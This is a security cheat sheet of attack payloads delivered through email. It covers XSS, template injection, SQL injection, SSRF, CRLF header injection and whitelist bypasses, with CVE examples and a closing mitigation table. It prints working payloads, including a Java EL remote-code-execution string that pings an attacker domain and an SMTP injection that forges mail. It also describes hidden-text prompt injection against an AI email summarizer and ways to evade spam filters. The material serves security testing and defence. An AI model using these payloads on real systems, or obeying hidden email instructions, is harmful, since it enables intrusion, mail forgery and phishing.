# Email Attacks

## XSS (Cross-Site Scripting)

### Attack Vectors

| Attack | Payload |
| ------ | -------- |
| XSS | `<p>test+(alert(0))@example.com</p>` |
| | `<p>test\@example(alert(0)).com</p>` |
| | `<p>"alert(0)"@example.com</p>` |
| | `<p>\<script src=//xsshere?”@email.com</p>` |

### Real-World Exploitation

XSS attacks remain a viable threat against webmail interfaces. In 2024 and 2025, the Kremlin-backed hacking group Sednit (also tracked as APT28, Fancy Bear, Forest Blizzard, and Sofacy) exploited XSS vulnerabilities in multiple mail server platforms including Roundcube, MDaemon, Horde, and Zimbra .

**How It Works:** Attackers embed malicious JavaScript code within HTML portions of an email. When a victim views the email using a vulnerable webmail client, the JavaScript executes in their browser context .

**Real Attack Example (Operation RoundPress):** On September 11, 2024, a Ukrainian target received a phishing email appearing to contain legitimate news excerpts from the Kyiv Post. Hidden within the HTML code of the email body was an XSS exploit targeting CVE-2023-43770. When opened, the exploit caused the victim's email client to:
- Send all contacts to attacker-controlled servers
- Forward previous emails to the attackers
- Create sieve rules to forward all future emails to a Sednit-controlled address 

**Why This Works:** The malicious JavaScript runs only when the email is viewed in a vulnerable webmail instance. However, the infection has persistence as long as the email remains in the inbox, executing every time the email is reopened .

### Impact
Data exfiltration, contact harvesting, persistent mailbox compromise, and email forwarding rules creation that survive password changes.

---

## Template Injection / SSTI (Server-Side Template Injection)

### Attack Vectors

| Attack | Payload |
| ------ | -------- |
| Template injection | `<p>"<%= 7 \* 7 %>"@example.com</p>` |
| | `<p> test+(${{7\*7}})@example.com</p>` |

### Real-World Exploitation

Email template injection occurs when applications dynamically generate email content using template engines that evaluate user-controlled input as code rather than plain text.

**Real Attack Example (2025 Penetration Test):** During a security assessment of a document distribution platform, researchers discovered that the password reset email template was vulnerable to SSTI. The application allowed administrators to customize email templates containing the `${url}` placeholder .

**Exploitation Steps:**

1. **Initial Detection:** The tester modified the email template to include `${7*7}`. When the password reset email was triggered, the received email contained `49` instead of the literal string, confirming expression evaluation .

2. **Engine Identification:** The tester discovered that Java objects could be referenced directly using `$ {''.getClass()}`. The resulting email output `class java.lang.String` confirmed Java EL (Expression Language) was being used .

3. **Information Gathering:** System information was extracted using:
   - Java Version: `${''.getClass().forName('java.lang.System').getProperty('java.version')}`
   - OS Information: `${''.getClass().forName('java.lang.System').getProperty('os.name')}`
   - Environment Variables: `${''.getClass().forName('java.lang.System').getenv()}` 

4. **Remote Code Execution:** Command execution was achieved using:
   ```
   ${''.getClass().forName('java.lang.Runtime').getRuntime().exec('cmd /c ping attacker-domain.oastify.com')}
   ```
   DNS interactions confirmed successful command execution. The tester then retrieved command output using Java's Scanner class to read the process input stream .

### Impact
Full remote code execution on the application server, system compromise, sensitive data access, and internal network pivoting.

---

## SQL Injection (SQLi)

### Attack Vectors

| Attack | Payload |
| ------ | -------- |
| SQLi | `<p>"' OR 1=1 -- '"@example.com </p>` |
| | `<p>"mail'); SELECT version();--"@example.com</p>` |
| | `<p>a'-IF(LENGTH(database())=9,SLEEP(7),0)or'1'='1"@a.com</p>` |

### Real-World Exploitation

Email addresses can be used as vectors for SQL injection when they are incorporated unsafely into database queries by email server software.

**Real Attack Example (Exim Mail Server, 2025):** Security researchers at NIST discovered critical SQL injection vulnerabilities in Exim mail server version 4.99 when configured with SQLite hints database support .

**Vulnerability Details:**
- **CVE-2025-26794 (Incomplete Fix):** The fix for a previous SQL injection vulnerability failed to properly escape single-quote characters in database queries. Attackers can exploit this by sending specially crafted SMTP commands containing malicious email addresses .

**Exploitation Method:**
Attackers inject SQL payloads through email addresses in SMTP commands. The most vulnerable configurations include "per_addr" mode with explicit sender address keys or "unique" parameters containing attacker-controlled values. Rate-limited ACLs that incorporate sender addresses are particularly susceptible .

**Example Payloads in the Wild:**
- Time-based blind injection: `a'-IF(LENGTH(database())=9,SLEEP(7),0)or'1'='1"@a.com`
- Data exfiltration: `"mail'); SELECT version();--"@example.com`
- Authentication bypass: `"' OR 1=1 -- '"@example.com`

**Impact:**
Arbitrary SQL query execution, data exfiltration, and in conjunction with heap buffer overflow vulnerabilities (also discovered in Exim), potential remote code execution .

---

## SSRF (Server-Side Request Forgery)

### Attack Vectors

| Attack | Payload |
| ------ | -------- |
| SSRF | `<john.doe@abc123.burpcollaborator.net>` |
| | `john.doe@[127.0.0.1]` |

### Real-World Exploitation

SSRF via email occurs when applications make server-side requests based on email addresses or email-related parameters without proper validation.

**Real Attack Example (Chamilo LMS, CVE-2026-33715):** A critical vulnerability was discovered in Chamilo LMS version 2.0-RC.2 where the `install.ajax.php` endpoint is accessible without authentication even on fully installed instances. The `test_mailer` action accepts an arbitrary Symfony Mailer DSN string from POST data and uses it to connect to an attacker-specified SMTP server .

**Exploitation Method:**
An unauthenticated attacker can:
1. Send a crafted request to `install.ajax.php` with a malicious DSN pointing to internal hosts
2. Force the server to make SMTP connections to arbitrary internal IP addresses
3. Use error responses from failed SMTP connections to map internal network topology 

**Dual Impact:**
- **SSRF:** Enables probing of internal networks via SMTP protocol
- **Open Relay Abuse:** Attackers can weaponize the Chamilo server as an open email relay for phishing and spam campaigns, with emails appearing to originate from the server's trusted IP address 

**Detection Using Burp Collaborator:**
Attackers use payloads like `<john.doe@attacker-controlled.burpcollaborator.net>` to verify SSRF. When the server attempts to verify the email address or process the message, it makes a request to the collaborator domain, confirming the vulnerability.

**Internal Network Probing:**
Payloads like `john.doe@[127.0.0.1]` or `john.doe@[192.168.1.1]` can be used to access internal services that should not be exposed to the internet.

### Impact
Internal network reconnaissance, firewall bypass, open email relay abuse for spam/phishing campaigns, and information disclosure about internal network topology.

---

## Parameter Pollution

### Attack Vectors

| Attack | Payload |
| ------ | -------- |
| Parameter Pollution | `victim&email=<attacker@example.com>` |

### Explanation

Email parameter pollution occurs when an application processes multiple instances of the same parameter (such as `email=`) and handles them inconsistently. Attackers exploit this by injecting additional parameters that may override or append to the intended recipient or sender.

**Common Exploitation Scenarios:**
- **Account Takeover:** When password reset functionality processes the first email parameter for verification but sends the reset link to the second parameter
- **Email Forwarding Abuse:** Injecting a second recipient address to silently receive copies of sensitive emails
- **Webmail Interface Manipulation:** Exploiting how web applications parse query strings containing email addresses

**Example Attack Flow:**
```
Original Request: /reset?email=victim@example.com
Malicious Request: /reset?email=victim@example.com&email=attacker@example.com
```
If the application verifies using the first parameter but sends the reset link to the last parameter, the attacker receives the password reset token.

---

## Email Header Injection / CRLF Injection

### Attack Vectors

| Attack | Payload |
| ------ | -------- |
| (Email) Header Injection | `<p>"%0d%0aContent-Length:%200%0d%0a%0d%0a"@example.com</p>` |
| | `<p>"<recipient@test.com>>\r\nRCPT TO:\<victim+"@test.com</p>` |

### Real-World Exploitation

Email header injection (also known as SMTP command injection or CRLF injection) occurs when user-controlled input is incorporated into email headers or SMTP commands without proper sanitization of carriage return (`\r`) and line feed (`\n`) characters.

**Real Attack Example 1 (Netty SMTP Codec, CVE-2025-59419):** A critical CRLF injection vulnerability was discovered in Netty's SMTP codec library. The root cause is the lack of input validation for Carriage Return (`\r`) and Line Feed (`\n`) characters in user-supplied parameters such as recipient addresses .

**Full Exploit Payload:**
```java
String injected_recipient = "legit-recipient@example.com\r\n" +
                          "MAIL FROM:<ceo@trusted-domain.com>\r\n" +
                          "RCPT TO:<victim@anywhere.com>\r\n" +
                          "DATA\r\n" +
                          "From: ceo@trusted-domain.com\r\n" +
                          "To: victim@anywhere.com\r\n" +
                          "Subject: Urgent: Phishing Email\r\n" +
                          "\r\n" +
                          "This is a forged email that will pass authentication checks.\r\n" +
                          ".\r\n" +
                          "QUIT\r\n";
```

**Why This Is Devastating:** Because the injected commands are sent from the server's trusted IP address, any resulting forged emails will pass SPF and DKIM authentication checks, making them appear completely legitimate to victims .

**Real Attack Example 2 (Plunk Email Platform, CVE-2026-34975):** A CRLF header injection vulnerability was discovered in Plunk versions prior to 0.8.0. User-supplied values for `from.name`, `subject`, custom header keys/values, and attachment filenames were interpolated directly into raw MIME messages without sanitization .

**Exploitation Impact:**
- Injecting `Bcc` headers to silently forward emails to attacker addresses
- Adding `Reply-To` headers to redirect responses
- Spoofing senders by manipulating `From` fields
- Allowing authenticated API users to compromise email integrity 

**Real-World Consequences:**
- **Economic Manipulation:** Forged emails from corporate executives can announce false financial results or fake mergers to manipulate stock prices
- **Sophisticated Phishing:** Emails that bypass SPF/DKIM are highly likely to deceive users and security filters 

---

## Wildcard Abuse

### Attack Vectors

| Attack | Payload |
| ------ | -------- |
| Wildcard abuse | `%@example.com` |

### Explanation

Wildcard abuse leverages email systems that treat certain characters (particularly `%` and `@`) specially when processing email addresses. This can result in:
- **Catch-all rule exploitation:** Sending emails to `%@domain.com` may match all users in a system
- **Format string vulnerabilities:** Some older email servers interpret `%` as a format string specifier
- **Routing bypass:** Certain mail transfer agents mishandle wildcard addresses, allowing attackers to bypass filtering rules

---

## Bypass Whitelist Techniques

### Attack Vectors

| Technique | Payload |
| --------- | ------- |
| Bypass whitelist | `inti(;inti@inti.io;)@whitelisted.com` |
| | `inti@inti.io(@whitelisted.com)` |
| | `inti+(@whitelisted.com;)@inti.io` |

### How It Works

Whitelist bypass techniques exploit how different email systems parse and validate email addresses. The same string may be considered valid by one system but interpreted differently by another.

**Common Parsing Discrepancies:**
- **Nested comments:** `user(;malicious@attacker.com;)@whitelisted.com` - Some parsers ignore parenthetical comments while others process them
- **Multiple @ symbols:** `user@attacker.com(@whitelisted.com)` - The validation system may check the rightmost domain while the delivery system uses the leftmost
- **Delimiter injection:** `user+(@whitelisted.com;)@attacker.com` - Plus-addressing and semicolon handling varies between systems

**Attack Scenario:**
An application validates email addresses against a whitelist (e.g., only `@company.com` domains). By using nested syntax, an attacker can pass validation while causing the actual email to be delivered to or from an external domain.

---

## HTML Injection in Email Clients

### Attack Vectors

| Attack | Payload |
| ------ | -------- |
| HTML Injection in Gmail | `inti.de.ceukelaire+(<b>bold<u>underline<s>strike<br/>newline<strong>strong<sup>sup<sub>sub)@gmail.com` |

### Real-World Exploitation

Email clients that render HTML content from email addresses (such as in the "From" display name) are vulnerable to HTML injection. Google's Gmail has historically been vulnerable to these techniques, though many have been patched.

**Attack Method:**
Attackers create email addresses containing HTML tags. When the email client displays the sender's name or email address, the HTML is rendered rather than escaped.

**Potential Impacts:**
- **UI Redressing:** Injecting buttons or links that overlay legitimate UI elements
- **Phishing:** Creating fake login forms within the email interface
- **Information Disclosure:** Using CSS selectors to extract information from the page
- **Defacement:** Altering the visual presentation of the email client

**Example Payload Components:**
- `<b>bold</b>` - Bold text formatting
- `<u>underline</u>` - Underlined text
- `<s>strike</s>` - Strikethrough text
- `<br/>` - Line breaks to break layout
- `<strong>strong</strong>` - Strong emphasis
- `<sup>sup</sup><sub>sub</sub>` - Superscript and subscript text

---

## Bypass Strict Validators

### Common Email Accounts Used in Attacks

```
support@
jira@
print@
feedback@
asana@
slack@
hello@
bug(s)@
upload@
service@
it@
test@
help@
tickets@
tweet@
```

### Attack Methodology

**Login with SSO & Integrations:**
Many organizations configure Single Sign-On (SSO) and third-party integrations to automatically trust emails from specific addresses or domains. Attackers have successfully:

1. **Created accounts on GitHub and Salesforce using XSS payloads in email addresses:** Both platforms historically allowed email addresses containing XSS payloads during registration
2. **Abused integration trust relationships:** If an organization's Slack integration trusts emails from `slack@` or `jira@`, attackers register these addresses on external systems
3. **Leveraged service-to-service authentication:** Integrations often have elevated privileges and reduced scrutiny

**Real-World Impact:**
- **GitHub Integration Abuse:** Security researchers demonstrated that by creating a GitHub account with a specific email format, they could access other organizations' CASB findings due to missing validation of installation IDs 
- **Salesforce Email-to-Case Exploitation:** Salesforce's Email-to-Case feature can be abused when attackers control email addresses that trigger automated case creation with XSS payloads

---

## Emerging Threats: AI-Powered Email Attacks

### AI Prompt Injection via Hidden Email Content

**Real Attack Example (Google Gemini for Workspace, 2025):** A prompt injection vulnerability was disclosed that targets Google Gemini's email summarization feature. Attackers embed invisible instructions within emails that are executed by Gemini when generating summaries .

**Attack Mechanism:**
1. Attacker crafts an email containing malicious instructions hidden using CSS:
   - `font-size: 0` (zero-size font)
   - `color: white` (white text on white background)
2. The email contains no attachments or direct links, allowing it to bypass traditional security filters
3. When a recipient uses Gemini to summarize the email, the AI processes the hidden instructions
4. Gemini obeys the injected commands and generates misleading output 

**Real Exploit Example:** The researcher demonstrated that Gemini followed an embedded instruction to generate a security warning falsely claiming the user's Gmail password had been compromised, including a fabricated support phone number. Users trust Gemini's output as an official Google Workspace function, making this highly effective for phishing .

### Modern Filter Bypass Techniques

Attackers continue developing methods to bypass email security filters:

1. **White Text Technique:** Adding white font text on white background containing benign phrases (e.g., from public domain books) to manipulate spam filter scoring 

2. **Phantom Newsletter:** Including legitimate-looking newsletter content far below the email body with trusted domain links to raise trustworthiness scores 

3. **Obfuscation:** Adding invisible special characters between letters of suspicious phrases (e.g., "K e e p  s a m e  p a s s w o r d") that are visible to filters but not humans 

4. **Content Bloating:** Padding emails with large amounts of legitimate-looking content to overwhelm filter analysis or cause timeouts before malicious content is examined 

---

## Post-Exploitation: Malicious Inbox Rules

Once an attacker gains access to an email account (via credential theft or session hijacking), they often create malicious inbox rules to maintain persistence and evade detection .

**Common Malicious Rules:**

| Rule Type | Purpose |
|-----------|---------|
| Forwarding rules | Automatically forward emails containing keywords like "payment," "invoice," or "confidential" to external addresses |
| Deletion rules | Delete security alerts, password reset notifications, or MFA enrollment emails to prevent victim awareness |
| Folder rules | Move specific emails to rarely-used folders (RSS feeds, junk, archive) and mark as read |
| Reply rules | Set up automatic replies that impersonate the victim to extract information |

**Why This Is Dangerous:** Even if the victim changes their password, enables MFA, or completely rebuilds their computer, malicious inbox rules remain active. Attackers maintain persistent access until the rules are manually discovered and deleted .

**Real-World BEC Example:** Attackers create a rule deleting all incoming emails from the CFO, then impersonate the CFO to send fraudulent wire transfer requests to finance department employees who never receive the real CFO's conflicting emails .

---

## Remediation Summary

| Vulnerability | Key Mitigations |
|---------------|------------------|
| XSS | Contextual output encoding, Content Security Policy, regular webmail software updates |
| SSTI | Sandbox template engines, restrict expression evaluation to predefined placeholders only |
| SQLi | Parameterized queries, input validation, regular security patching |
| SSRF | Allowlist validation for URLs/DNS names, network segmentation |
| Header Injection | Validate input for CR/LF characters (`\r`, `\n`), use safe email construction libraries |
| Wildcard Abuse | Explicit address resolution, avoid format string interpretation |
| AI Prompt Injection | Strip hidden HTML content (zero-size font, invisible colors) before AI processing |
